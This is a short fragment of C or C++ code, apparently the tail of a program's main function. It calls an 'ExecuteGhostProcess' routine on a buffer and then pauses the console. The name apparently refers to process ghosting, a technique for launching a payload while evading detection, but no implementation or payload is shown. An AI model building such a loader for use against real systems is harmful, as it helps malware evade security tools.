	BOOL success = ExecuteGhostProcess(buffer, bufferSize);
	system("pause");


}